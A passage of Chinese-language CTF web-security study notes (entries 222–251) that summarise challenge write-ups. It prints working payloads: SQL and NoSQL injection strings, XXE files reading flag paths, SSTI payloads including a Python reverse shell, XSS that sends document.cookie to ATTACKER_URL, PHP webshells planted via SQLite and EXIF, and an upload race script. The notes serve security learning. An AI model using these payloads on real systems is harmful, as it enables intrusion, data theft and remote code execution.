提交给admin bot的url为部署以上代码的公网url。
222. [urmombotnetdotnet.com 4](https://github.com/BYU-CSA/BYUCTF-2023/blob/main/urmombotnetdotnet.com/Chall4.md)
- sql的数据库会忽略类似`\u0000`的unicode，但python不会。意味着当注册一个用户名`\u0000\u0000\u0000a`时，python使用len函数的结果是4。后续可以用用户名`a`查询出来这个用户。
223. [urmombotnetdotnet.com 5](https://github.com/BYU-CSA/BYUCTF-2023/blob/main/urmombotnetdotnet.com/Chall5.md)
- IPv6 have a scope field that is an arbitrary string using the % delimiter. For example, the following IPv6 address is valid:2001:db8::1000%random`
224. [Notes](https://github.com/BYU-CSA/BYUCTF-2023/tree/main/notes)
- 使用python+ngrok搭建临时公网ip网站。对于没有限制提交给admin bot的url的xss/csrf题目，可以将bot引到自己搭建的网站上执行任意恶意payload（所以大部分题目都会限制提交给bot的url必须是同一个域名）。
  - 将solve.html保存在一个文件夹内，并在相同文件夹下运行`python3 -m http.server`
  - 运行`ngrok http 8000`（python开启的server默认端口8000，如果是其他端口就换成对应的端口号），Forwarding处有ngrok给出的子域名（subdomain）。
  - 现在即可使用subdomain+/solve.html访问。即文件保存在的文件夹是网站的根目录。
- Chrome 80+ 默认将cookie设为SameSite Lax（除非服务器自己设置为别的），意味着cookie “will be sent only in GET request in top window navigations such as `<a>` tag, window.open()..”。但是有个例外，如果一个cookie是新设置的或者被改动过，两分钟内cookie会被设为SameSite None，两分钟后才会恢复成Lax。在这两分钟的期限内可以随意cross origin，例如利用forms。https://medium.com/@renwa/bypass-samesite-cookies-default-to-lax-and-get-csrf-343ba09b9f2b
225. [HUUP](https://github.com/BYU-CSA/BYUCTF-2023/tree/main/HUUP)
- 使用python socket库建立udp连接（udp传输http request）。
```py
import socket
UDP_IP = 
UDP_PORT = 
def req(path):
    http_get = f"GET /{path} HTTP/1.1" + "\x0d\x0a"
    http_get += "Host: xxx" + "\x0d\x0a"
    http_get += "Connection: close" + "\x0d\x0a"
    http_get += "\x0d\x0a"
    MESSAGE = http_get
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
    s.connect((UDP_IP, UDP_PORT))
    s.send(bytes(MESSAGE, "utf-8"))
    res = s.recv(1024)
    return res.decode()
```
用udp传输http request需要多次执行，一次不一定能得到结果（服务器会返回200，但是没有实际body内容）。因为udp有很高的概率只传header但不传content body，导致request格式不对得不到返回结果。
- 像这道题的情况也可以尝试发送一个`GET / HTTP/0.9`请求。HTTP/0.9是http的第一个版本，“It's a one-line protocol with no headers”。这个协议就不用担心udp不传body了，它只有一行，无需多次执行。
226. [EasyTP](https://blog.csdn.net/RABCDXB/article/details/122264363)
- thinkphp3.2.3反序列化pop链(sql注入&文件读取)：https://f5.pm/go-53579.html 。wp内包含报错注入，[开堆叠写shell](https://www.zhaoj.in/read-6859.html#WEB3_easytp)以及利用[rogue-mysql-server](https://github.com/allyshka/Rogue-MySql-Server):https://www.crisprx.top/archives/412#CTF_2021EasyTP 三种解法。注意事项：
  - 需要已知sql数据库的名称及密码
  - 最后一种解法需要公网ip
  - 报错注入解法使用的updatexml最多只能显示32位，需要搭配substr，reverse或mid（跟substr感觉差不多）获取完整flag。
  - 蚁剑版本不同，开堆叠写shell后连接sql数据库的结果也不同。蚁剑要是不行就用冰蝎的导出功能。
- thinkphp可通过输入不存在的控制器获取版本。`http://xxx.com/index.php/aaa`
227. [wzsc_文件上传](https://blog.csdn.net/qq_45608153/article/details/126312379)
- 文件上传条件竞争。服务器检测上传文件的后缀时，使用白名单会比黑名单过滤效果更好。但业务逻辑不能是“上传文件->服务器保存文件->保存后检测刚刚保存文件的后缀，如果不在百名单就删除“。这样容易出现条件竞争。在服务器保存和删除的间隙中，文件是可访问的。
```py
import threading
import os
import requests

class RaceCondition(threading.Thread):
    def __init__(self,url,fileName):
        threading.Thread.__init__(self)
        self.baseUrl=url
        self.fileUrl = self.baseUrl+'/upload/a.php'
        self.shellUrl =self.baseUrl+'/upload/shell.php'
        self.fileName=fileName

    def _get(self):
        r = requests.get(self.fileUrl)
        if r.status_code == 200:
            print('[*] create file shell.php success.')
            os._exit(0)

    def _upload(self):
        rs = requests.get(self.shellUrl)
        if rs.status_code == 200:
            print('[*] create file shell.php success.')
            os._exit(0)

    def run(self):
        while True:
            self.upload_file()
            self._get()
            self._upload()
    def upload_file(self):
        file = open(self.fileName, "rb")
        files = {"file": file}
        res=requests.post(self.baseUrl+"/upload.php",files=files)

if __name__ == '__main__':
    threads = 50

    for i in range(threads):
        t = RaceCondition("","")
        t.start()

    for i in range(threads):
        t.join()
```
228. [ez-sql](https://github.com/TJCSec/tjctf-2023-challenges/tree/main/web/ez-sql),[wp](https://www.youtube.com/watch?v=AqV3YUtcKGU&t=440s)
- LIKE字段处的sql注入。`SELECT * FROM table WHERE column LIKE '%name%'`,其中name内容完全可控。LIKE语句并不会影响union等多种注入的手法，`%`号表示匹配0或多个任意字符，也不会影响注入的结果。
- 当在express web里看见：
```js
const app = express();
app.use(express.urlencoded({ extended: true }));
```
表示url可传递数组。若网站逻辑没有明显区分传递的参数类型（如字符串与数组，两者都有length字段），此时就能考虑是否有type confusion了。
- js打印数组特性。
```js
name=['a','b'];
SELECT * FROM table WHERE column LIKE '%${name}%';
//SELECT * FROM jokes WHERE joke LIKE '%a,b%'
```
数组元素之间会用`,`连接起来。
- 当sql注入点在url传入的参数且参数是个数组时，可利用sqlmap注入url的数组传参。`sqlmap --url "http://xxx.com/search?name[0]=a&name[1]=2" -p "name[0]" --level 5 --risk 3 --dbms=sqlite --tables -dump`。如果数据库的类型不知道也可以不指定。此为测试语句，当测试出来哪种方法最快时，可以直接对sqlmap指定注入方式(例如union select)。`sqlmap --url "http://xxx.com/search?name[0]=a&name[1]=2" -p "name[0]" --dbms=sqlite --tables --technique=U`
- sqlite的union联合注入( https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md )
    - 查表名：`' UNION SELECT 1, sql FROM sqlite_master WHERE type="table" --`,`' UNION SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%`
    - 查column名称：`' UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name like 'table'--`
    - 查字段：`' UNION SELECT 1, flag FROM table--`,`' UNION SELECT column FROM mystery WHERE column like 'flag'--`,`'union select * from table --`
- [Query Parameterization](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)可预防sql注入，当题目里出现这些逻辑时就可以放弃考虑sql注入了
229. [yolo](https://github.com/TJCSec/tjctf-2023-challenges/tree/main/web/yolo),[wp](https://www.youtube.com/watch?v=AqV3YUtcKGU&t=1123s)
- CSP `script-src 'nonce-test'`指定只有带着`test`的script标签才能执行js。例如`<script>alert(1)</script>`会被浏览器阻挡，但`<script nonce="test">alert(1)</script>`则能执行（因为其指定的nonce值和服务器设置的csp值一致）
- CSP `default-src 'self'`阻挡了跨域fetch。如当前domain为`http://a.com`，fetch填写的url就只能是这个域名，`fetch("http://b.com")`会被浏览器阻挡。这种情况下的xss可以借助window.location将数据带出到webhook。`<script>window.location =ATTACKER_URL?x=document.cookie</script>`.写成`window['location']`或者`document.location`也是可以的。
230. [complainer](https://github.com/TJCSec/tjctf-2023-challenges/tree/main/web/complainer)
- 利用url重定向（redirect）实现xss。这题的非预期解在于/login路由会重定向：`/login?next=url`。即使能提交给admin bot的url只能是同域的，但是可以更改重定向的url为`javascript: url`，即可让bot执行任意js代码。
231. [CryptoMarket](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#cryptomarket)
- 使用curl发送HEAD请求：`curl -I <url> -vv`。也可使用python request库(获取cookie)：`request.head("url").cookies.get_dict()['name']`
- 构建字典并使用模块化的[flask unsign](https://pypi.org/project/flask-unsign/)爆破flask session SECRET_KEY
232. [Dumb Admin](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#dumb-admin)
- php文件上传基础绕过：https://book.hacktricks.xyz/pentesting-web/file-upload 。当shell.php的后缀不允许时，尝试用shell.png.php绕过（随便在前面加个符合上传要求的后缀）
- php exif_imagetype函数绕过：
     - 在shell文件前加上jpg文件头ffd8ffee(或者GIF89A)
     - 将shell使用exiftool插入图片的comment中：`exiftool -Comment="<?php system(\$_GET['cmd']) ?>" image.jpg` https://m44lr0m.vercel.app/writeups/dantectf-2023-web-challenges
234. [FlagShop](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#flagshop)
- js Object.assign函数不会导致严格意义上的[原型链污染](https://www.freebuf.com/articles/web/275619.html)。它确实会影响被assign的实例，但不会影响到对象本身。
```js
function A(){}
let a=new A();
let b={"__proto__":{"x":1}}; //let b={"x":1};
Object.assign(a,b);
//a实例会有x这个属性，但是A对象的__proto__并未被污染，还是Object。当然后面像那种不要__proto__也可以让a有x属性
```
- [integrity](https://www.w3.org/TR/SRI/)属性。在程序导入例如jQuery的外部库时，可能会使用integrity属性来保证引入的库是官方的而没有被修改过。jQuery的官方intergrity值可在[这里](https://releases.jquery.com/jquery/)找到。当程序标注的integrity与官方不同或者导入路径奇怪时（例如从本地而不是云端导入库），就要查看源码，里面与官方不同的地方可能就是漏洞的入手点。
- js寻找document中active的元素，并利用jQuery设置其内部html
    ```js
    if (document.activeElement.id === add.getAttribute('id')){
        message.html(getRoleText); //jQuery里直接设置html容易导致xss，append(),after()等同理。 
    }
    //By design, any jQuery constructor or method that accepts an HTML string — jQuery(), .append(), .after(), etc. — can potentially execute code. This can occur by injection of script tags or use of HTML attributes that execute code (for example, <img onload="">). Do not use these methods to insert strings obtained from untrusted sources such as URL query parameters, cookies, or form inputs.
    ```
    想要进入这个if分支要保证add的id为document中活跃元素的id，或者说add为活跃元素。xss里有两种方法解决：
    - 任意找一个类似`<div>`的tag，设置其id为空。`<div id=""></div>`
    - 找focusable的tag，如`<a>`,上种方法的`<div>`就不行。在url的最后加上anchor或autofocus指向`<a>`标签的id。`http://<a href='url' id='foo'>#foo`
235. [SecureHashedDb](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#securehasheddb)
- python bcrypt模块的bcrypt.checkpw函数可检查linux `$2y$`或`$2a$`bcrypt hash format。bcrypt hash可由htpasswd命令得来，或者用python：
```py
from passlib.hash import bcrypt
# htpasswd -bnBC 10 "" password | tr -d ':\n' | sed 's/$2y/$2a/'
hash = bcrypt.using(rounds=4).hash("data", ident="2y") #rounds 4 faster to generate
#linux的bcrypt hash即使是hash相同的字符串，每次也会得到不同的结果。因为每次hash都会有不同的随机salt加入hash
#https://stackoverflow.com/questions/66050881/bcrypt-different-hash-for-same-string
```
- mysql注入相关
  - 利用LIKE语句延时注入（Time Based Sql Injection）
    - 获取要爆出的数据的长度：`' or (select (select username from user LIMIT 1 OFFSET {offset}) AS ll having ll LIKE BINARY "{pattern}" and sleep(2)) -- abcd`。注意在使用LIKE语句时，永远搭配上binary关键字来区分大小写。
    - 爆数据：`' or (select (select username from user LIMIT 1 OFFSET {offset}) AS ll having ll LIKE BINARY "{pattern}" and sleep(2)) -- abcd`
  - 利用union select构造虚拟查询结果伪造身份登录。类似`28. sql注入`提到的内容，当应用限制必须要查出某个特定的用户名或是其他情况导致简单的`'or 1=1--`不能用时，可以利用联合查询构造出制定的用户信息。`' union select 1,(select username from user limit 1 offset 0),pwd--`.
  - mysql可用16进制表示法（0x开头）作为column里的数据（例如上一条的pwd可换为`0x...`），mysql会自动将其解码
- php sql的exec函数允许插入多个sql语句（即堆叠注入）。可用以下payload：
```php
;ATTACH DATABASE '/tmp/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
//https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---attach-database
```
在/tmp目录下创建一个连接至lol.php文件的数据库 。然后创建名为pwn的table，并往table里插入php代码。或者说往里面写了个shell。
- 此题预期解是利用php的反序列化漏洞实现rce。另一种方法在[这里](https://spiky-enquiry-e91.notion.site/Secure-Hashed-DB-25aee784ba96429e8b07586d43ea7016)有提到。因为应用内部调用了file_get_contents，且参数可控。于是可直接控制参数为`php://input`,然后传post参数为想读取的文件即可。另外也有人提到可用[PHP FILTER CHAINS](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle)（[工具](https://github.com/synacktiv/php_filter_chains_oracle_exploit)）。不过这种解法会产生非常长的payload，有时候会引发服务器502.
236. [Flag Shop](https://theromanxpl0it.github.io/ctf_hsctf2023/2023/06/12/flagshop.html)
- mongo db Blind [NoSQL](https://www.talend.com/resources/sql-vs-nosql/) injection(python)
    - [$where](https://www.mongodb.com/docs/manual/reference/operator/query/where/#mongodb-query-op.-where)注入：虽然是“nosql”，但是在不过滤用户输入，直接拼接参数的情况下也会引发注入。该子句用于`db.flags.find()`中，会执行任何传递给它的js代码。例：
```py
results = db.flags.find(
{
"$where": f"this.challenge.includes('{request.json['search']}')"
}, {
"_id": False,
"flag": False
})
```
此时可以尝试闭合实现注入。可以用分号注入多个句子：`'); this.flag.includes('flag{`，不过只有最后一个有效的条件会被执行，等于数据库实际查找的条件是`this.flag.includes('flag{`，忽略前面的`this.challenge.includes('')`。同理，也可用`&&`:`') && this.challenge.includes('flag')`。或者`||`:`'); 1==1 || this.challenge.includes('`。除了使用includes，还可使用`startsWith`:`') && this.flag.startsWith('`

237. [png-wizard-v3](https://github.com/hsncsclub/hsctf-10-challenges/tree/main/web/png-wizard-v3),[wp](https://kos0ng.gitbook.io/ctfs/ctfs/write-up/2023/hsctf/web-exploitation#png-wizard-v3-8-solves)
- svg文件相关Error-based XXE. 以下处理svg data的逻辑具有xxe漏洞：
    ```py
    svg_root=etree.parse(filename,parser=etree.XMLParser()).getroot()
    drawing=SvgRenderer(filename).render(svg_root)
    ```
当用户输入的xxe payload在服务端无回显时（无法下载xxe payload渲染后的结果文件，服务器只返回渲染是否成功而没有成品等），使用Error-based XXE。详情见：https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/
```xml
<?xml version="1.1" standalone="no" ?>
<!DOCTYPE svg  [
    <!ENTITY % NUMBER '
        <!ENTITY &#x25; file SYSTEM "file:///app/flag.txt">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %NUMBER;
]>
<!--file://为任意不存在的路径-->
<svg xmlns="http://www.w3.org/2000/svg" version="1.1"> <!--最后这一段不同题填的不同，写符合题目语境就好-->
&a;
</svg>
```
- 其他解法/unintended:
    ```xml
    <!--unintended-->
    <?xml version="1.1"?>
    <!DOCTYPE svg [
        <!ENTITY xxe SYSTEM "/app/flag.txt">
    ]>
    <svg viewBox="0 0 1000 300" class="test">
    <style>
    .test {
        width: &xxe;;
    }
    </style>
    <text>EXPLOIT</text>
    </svg>
    ```
    ```xml
    <!--localdtd-->
    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE bruh [
    <!ENTITY % localdtd SYSTEM "file:///usr/share/xml/docutils/docutils.dtd">
    <!ENTITY % yesorno '
    <!ENTITY &#x25; file SYSTEM "file:///app/flag.txt">
    <!ENTITY &#x25; eval "
    <!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///bruh/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    '>
    %yesorno;
    ]>
    ```
238. [mongodb](https://xhacka.github.io/posts/mogodb/)
- mongodb/[no sql injection](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)的绕过登录payload。例：
    ```py
    #https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code/83234
    user = db.users.find_one(
        {
        "$where":
        f"this.user === '{request.form['user']}' && this.password === '{request.form['password']}'"
        }
    )
    ```
    - 用户名：`' == '`，密码为空
    - 用户名与密码均为：`' || 'a'=='a`
239. [Very Secure](https://xhacka.github.io/posts/Very-Secure/)
- flask session secret key爆破：flask-unsign+字典。`flask-unsign --wordlist ./keys --cookie '' --unsign --no-literal-eval`。字典格式：每个key之间用`\n`分隔
- 如果不想用字典，也可以直接在程序里爆破key
```py
import itertools
import zlib
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import base64_decode

# from https://github.com/noraj/flask-session-cookie-manager/blob/master/flask_session_cookie_manager3.py
class MockApp(object):
	def __init__(self, secret_key):
		self.secret_key = secret_key

def encode(secret_key, session_cookie_structure):
	""" Encode a Flask session cookie """
	try:
		app = MockApp(secret_key)
		
		session_cookie_structure = session_cookie_structure
		si = SecureCookieSessionInterface()
		s = si.get_signing_serializer(app)
		
		return s.dumps(session_cookie_structure)
	except Exception as e:
		return "[Encoding error] {}".format(e)

def decode(session_cookie_value, secret_key=None):
	""" Decode a Flask cookie  """
	if (secret_key == None):
		compressed = False
		payload = session_cookie_value
		
		if payload.startswith('.'):
			compressed = True
			payload = payload[1:]
		
		data = payload.split(".")[0]
		
		data = base64_decode(data)
		if compressed:
			data = zlib.decompress(data)
		
		return data
	else:
		app = MockApp(secret_key)
		
		si = SecureCookieSessionInterface()
		s = si.get_signing_serializer(app)
		
		return s.loads(session_cookie_value)
cookie = 
for c in itertools.product(range(0, 256), repeat=2):
	k = bytes(c)
	try:
		print(decode(cookie, k))
	except Exception as e:
		pass
	else:
		print(k)
		break
```
240. [west-side-story](https://ebonyx.notion.site/web-west-side-story-27bed9514e14478a8ab4c3fd772dc011)
- python与mariadb处理json重复键名时的不同操作：python看最后一个key，mariadb看第一个。如：
```
json={"admin":true, "admin":false}
print(json['admin'])
python:false
mariadb:true
```
json由处理差异导致的漏洞可参考 https://bishopfox.com/blog/json-interoperability-vulnerabilities ，从这里面提到的内容入手

241. [RESTful swap](https://xhacka.github.io/posts/RESTful-swap/)
- 使用vim编辑文件后会额外出现[swap](https://www.baeldung.com/linux/vim-swap-files#:~:text=While%20editing%20a%20file%20with,copy%20of%20the%20edited%20file.)文件，为被编辑文件的拷贝，也就是说里面有被编辑文件的内容。swap文件命名遵循以下规律：
```sh
ls -a
. .. file1
vim file1
ls -a
. .. file1 .file1.swp
```
241. [cross-site-python](https://ctftime.org/writeup/37172)
- 利用[PyScript](https://pyscript.net/)进行XSS+沙盒逃逸。pyscript内部有`pyscript.Element`类，允许我们访问+修改DOM里的元素。以下是在无import环境下使用pyscript.Element修改DOM的代码：
```py
but = dict.__base__.__subclasses__()[363]("buttons") #363为pyscript.Element。此处获取按钮
but.element.innerHTML= ''
```
- 当python环境中无builtins时，可以参考这篇[帖子](https://www.reddit.com/r/Python/comments/yaqoux/recovering_cleared_globals_and_builtins/)恢复原本的builtins。有了builtins就能正常使用import了。 https://ctftime.org/writeup/37185
- 从pyscript中可以获取js模块，进而可使用js的函数。
```py
js = sys.modules['pyscr' + 'ipt'].js
js.fetch("url" + js.document.cookie)
```
242. [trusted shop](https://ctftime.org/writeup/37177)
- js puppeteer+xss。注意puppeteer基本等于headless chrome，其打开/访问的页面可能会出现xss。反之普通的fetch等访问页面则不会出现。xss的本质是以打开网页的受害者的身份执行js代码，所以可以：
  - 扫描本机端口。代码参考这篇[帖子](https://www.incolumitas.com/2021/01/10/browser-based-port-scanning/)。wp里有改动后脚本，将测试数量改为10以求更快的速度（虽然可能出现false positive），同时删除并行（parallel）因为题目服务器无法支持并行的多个同时请求。
  - 发送graphql请求。此处又有一个小技巧：假设网站开启了同源策略（same-origin policy），xss想要发送某些内容到非同源的网站就不能简单使用fetch了，不过可以用form。如果目标网站(比如graphql)只接收json数据该怎么办？如何用html form发送json数据？可以像下面这样：
    ```html
    <form name="myForm" id="myForm" action="url" method="POST" enctype="text/plain">
      <input name='{"variables":{},"' value='":{},"query":"query{findFirstItemOrThrow(where:{id:2}){download}}"}' />
    </form>

    <script>
        window.onload = function(){
        document.forms['myForm'].submit();
        }
    </script>
    ```
    首先`enctype="text/plain"`保证发送的内容不会被urlencode（graphql不会urldecode），然后利用post传参的特点拼出json：`{"variables":{},"=":{},"query":"..."}`。这个技巧要求目标网站不看请求的Content-Type头，单纯尝试接收类似json的数据。
- query-engine（graphql）相关。相关源码可在prisma/prisma-engines仓库找到，其中路由信息可在[这里](https://github.com/prisma/prisma-engines/blob/main/query-engine/query-engine/src/server/mod.rs#L48)找到。
  - query-engine的端口是随机的，在30000到50000之间。
  - mutation更改数据库中数据的请求。`{"variables":{},"query":"mutation {\n  updateManyItem(data: { price: {set: 0}  }, where: { id: 2 }) { count }}"}`。将id为2的物品价格设为0，当然不同题目的参数不一样。若服务器返回`QueryError(SqliteFailure(Error{ code: ReadOnly, extended_code: 8 }, ...)`，说明背后的数据库不允许当前用户改动数据，readonly。
243. [wanky mail](https://ctftime.org/writeup/37173)
- python flask ssti.即使是像下面的函数一样尝试用`{% raw %}`包裹未经过滤的字符串，仍然有注入风险。
    ```py
    def esc(s: str):
        return "{% raw %}" + s + "{% endraw %}"
    ```
    闭合即可。`{% endraw %}{{ code }}{% raw %}`
  - ssti注入payload：
    - `{{ get_flashed_messages.__globals__.__builtins__.__import__("os").listdir() }}`
    - `{{ get_flashed_messages.__globals__.__builtins__.open("flag.txt").read() }}`
    - `{{ ''.__class__.__base__.__subclasses__()[352](["python", "-c", "import socket,os,pty;s=socket.socket();s.connect(('ip',port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/sh')"]) }}`:反弹shell
    - `{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('cat flag.txt').read()}}{%endif%}{% endfor %}`:无需另外爆破索引
    - `{{''.__class__.__mro__[1].__subclasses__()[352]("cat /flag*", shell=True, stdout=-1).communicate()}}`
- python与SMTP服务器进行交互。
    ```py
    import smtplib
    msg=
    smtplib.SMTP('domain',8025).sendmail(
        'sender', 
        'receiver',
        msg
    )
    ```
    ```py
    from pwn import *
    def send_mail(content, address):
        r = remote("domain", 25)
        r.newline = b"\r\n"
        r.recvline()
        r.sendline(b"HELO domain")
        r.recvline()
        r.sendline(b"MAIL FROM:" + address.encode() + b"@domain")
        r.recvline()
        r.sendline(b"RCPT TO:" + address.encode() + b"@domain")
        r.recvline()
        r.sendline(b"DATA")
        r.recvline()
        r.sendline(content.encode())
        r.sendline(b"\r\n.")
        r.recvline()
        r.sendline(b"QUIT")
        r.recvline()
        r.close()
    send_mail('', input("address: ").strip())
    ```
244. [gambling](https://github.com/Kaiziron/gpnctf2023-writeup/blob/main/gambling.md)
- blockchain solidity [frontrunning](https://omniatech.io/pages/decoding-frontrunning-understanding-the-key-terms-and-techniques/)例题。想快速了解这种技巧可以看[视频](https://www.youtube.com/watch?v=uElOqz-Htos).个人认为frontrunning打的是信息差。一个简单的案例：假设有A和攻击者B，以及货币C，价格为1。A尝试购买C货币时被B提前得知，于是B尝试在A之前购买C货币（支付更高的gas fee从而先处理B的请求）。那么到A购买的时候，C货币的价格就涨了，比如涨到1.2。等A买完，B再卖掉，净赚1.2-1的货币差值。
- [VRF Security Considerations](https://docs.chain.link/vrf/v2/security)(Verifiable Random Function)：Don't accept bids/bets/inputs after you have made a randomness request。此题正是违反了这条导致frontrunning。接着上一条，其实frontrunning不一定要两个人，它只是“提前知道某个信息并获利”的手段。现在有个这样逻辑的合约A：
	- enter(num)函数：输入一个num数字，同时合约A向随机数合约B发送随机数请求
	- 合约B返回随机数
	- claim函数：判断num是否与合约B返回的随机数相同

漏洞点在于，在发送随机数请求和返回随机数的中间，没有限制用户不能再调用enter函数。加上合约运行时的一举一动是可以在mempool里看到的，并且任何人都能从RPC provider（如[quicknode](https://www.quicknode.com/)）那里获取到mempool内容，便有了frontrunning。我们可以随便enter一个数字，在合约B返回随机数之前，提前从mempool读取到这个随机数，然后使用更高的gas fee再次enter这个正确的随机数，让oracle先处理我们这个请求。最后在第二次随机数返回前，调用claim，完成攻击。
- 一些python web3脚本编写的基础知识。
```py
from web3 import Web3, HTTPProvider
web3 = Web3(HTTPProvider('<rpc url>'))
gambling_abi = #https://www.quicknode.com/guides/ethereum-development/smart-contracts/what-is-an-abi 。可在Remix里compile合约后获得
gambling_contract = web3.eth.contract(address='', abi=gambling_abi)
#wp里还包含：如何转账（transaction）
#如何从RPC provider那里获取mempool内容
#cast命令调用合约函数
```
245. [Stickers](https://github.com/daffainfo/ctf-writeup/tree/main/NahamCon%20CTF%202023/Stickers)
- CVE-2022-28368 - [Dompdf RCE利用](https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf)。使用工具： https://github.com/rvizx/CVE-2022-28368/tree/main 。`python3 dompdf-rce.py --inject "将html转为pdf的url" --dompdf "http://vuln/dompdf/"`。该payload可以反弹shell。
	- `Unable to stream pdf:headers already sent`为dompdf的错误提示。还有另一种方法判断：由dompdf生成出来的pdf的exif Producer字段会写dompdf的版本。
    - 使用php版本的[poc](https://github.com/positive-security/dompdf-rce)：https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Stickers.md
    - 详细步骤： https://meashiri.github.io/ctf-writeups/posts/202306-nahamcon/#stickers ， https://v3he.io/posts/nahamcon-ctf-2023-stickers/
    - 视频讲解： https://www.youtube.com/watch?v=fUiHQS85vlQ&list=PLldZ8EeOcu7fbu4tdAzVxVxJBr0RLnloa&index=5
246. [Marmalade 5](https://github.com/LazyTitan33/CTF-Writeups/blob/main/Nahamcon-2023/Web/Marmalade_5.md)
- jwt MD5_HMAC爆破
    - python字典无第三方库爆破。解析： https://github.com/Crypto-Cat/CTF/blob/main/ctf_events/nahamcon_23/web/marmalade_5.md
    - john 字典爆破jwt。 https://github.com/D13David/ctf-writeups/tree/main/nahamcon23/web/marmalade5
    - c#脚本爆破： https://github.com/g0ttfrid/CTF-Writeups/tree/master/NahamCon%202023/Marmalade%205
247. [Museum](https://github.com/LazyTitan33/CTF-Writeups/blob/main/Nahamcon2023/Web/Museum.md)
- 本地文件包含（LFI）+ssrf。
- fuzz工具[ffuf](https://github.com/ffuf/ffuf)+字典[SecLists](https://github.com/danielmiessler/SecLists/tree/master)（可用来测试文件包含）
- 文件包含可以尝试在路径前添加`/./`,或者`//etc/passwd`。总之多试一下这种奇怪的url。 https://github.com/SQLKinkjection/Writeups/blob/main/2023/nahamcon/Web/Museum/Museum.md
248. [Transfer](https://github.com/okadir/CTF-s/tree/main/nahamCon-2023/Transfer)
- python sqlite注意事项：
```py
c.executescript(sql)
res = c.fetchone()
```
以上代码永远无法查询出结果，除非把executescript换成execute。同时需要注意的是，executescript允许同时执行多条语句，可能会有堆叠注入。
- python pickle反序列化RCE reverse shell。即使在目标机器curl，wget和nc均没有的情况下，仍然可以通过python命令反弹shell。
249. [Pirates/Supplier](https://medium.com/@williamhanugra/nahamcon-ctf-2023-a32d4ca46132)
- Gitea(< 1.16.7) RCE:[CVE-2022-30781](https://tttang.com/archive/1607/)利用。有两种利用方式：
    - 手动创建一个HTTP服务，配置endpoint从而伪装一个Gitea实例
    - 使用自己机器上的msf自动加载payload。不过这样就要VPS了
- [drone](https://ijayer.github.io/post/tech/devops/cicd/20180925-cicd-03-drone-01-basic/):drone.yml文件中的steps下的命令会在有push到main时被调用。devOps相关的挑战可以先看这个文件，了解pipeline是如何运作的。
- Makefile内部执行系统命令，不要随便make来源不明的Makefile。同理，攻击者也可以通过修改Makefile达到执行命令的目的。
250. [fancier-page](https://github.com/hsncsclub/hsctf-10-challenges/tree/main/web/fancier-page),[wp](https://sm-optimizes.amateurs-team.pages.dev/writeups/HSCTF-2023/fancier-page)
- [arg.js](https://github.com/stretchr/arg.js/)导致的js原型链污染。arg.js功能十分强大，可以直接从url传参一个object或是list，关键是键名可以随意控制，于是易污染`__proto__`.
251. [Biohazard](https://github.com/google/google-ctf/tree/master/2023/web-biohazard)
- [strict CSP](https://www.w3.org/TR/CSP3/#strict-csp)（满足特定条件的CSP才能被称为strict）+[Trusted Types](https://juejin.cn/post/6978694516840595487)(也是CSP的一部分，是个header，禁止一些危险的API被浏览器调用)不一定能完全防止xss。[Dom clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)+[prototype pollution](https://portswigger.net/web-security/prototype-pollution)/外部库的错误使用通常是入手点
- 接着第234点提过的，Object.assign通常没有原型链污染
```js
Object.assign({}, JSON.parse('{"__proto__":{"polluted": true}}'));
console.log(Object.prototype.polluted); // undefined
```
但是也有例外。若assign的第一个参数是Object.prototype，污染就成立了。
```js
Object.assign(({})['__proto__'], JSON.parse('{"polluted": true}'));
console.log(Object.prototype.polluted); // true
```
- [closure sanitizer](https://google.github.io/closure-library/api/goog.html.sanitizer.HtmlSanitizer.html)可利用原型链污染绕过：https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has 。此时一般已经有xss了，除非像这题一样开了Strict CSP 和 Trusted Types，没法直接写payload，只能利用原型链污染使用网页本来就有的内容实现xss
- `bootstrap.js`里的内容可自定义，通常为调试所用，不为题目的一部分。但也不能完全排除这种可能性，因为这题的漏洞就从`bootstrap.js`里开始。
- iframe标签有个csp属性，设置被引用内容的csp。违反csp的内容将不会正常加载。可以利用这个特点故意阻止目标网页某些资源的加载。
- 这题还有个既不用原型链污染也不用dom clobbering的[非预期解](https://gist.github.com/arkark/340ffadc009a4dd07be6696e0dec4553).查看题目使用的closure库的[源码](https://github.com/shhnjk/closure-library/blob/master/closure/goog/demos/xpc/minimal/index.html)，发现这个index.html是个demo page，作用是在两个不同的网站之间发消息。里面有个log函数：
```js
function log(msg) {
  logEl || (logEl = goog.dom.getElement('log'));

  var msgEl = goog.dom.createDom(goog.dom.TagName.DIV);
  msgEl.innerHTML = msg;
  logEl.insertBefore(msgEl, logEl.firstChild);
}
```
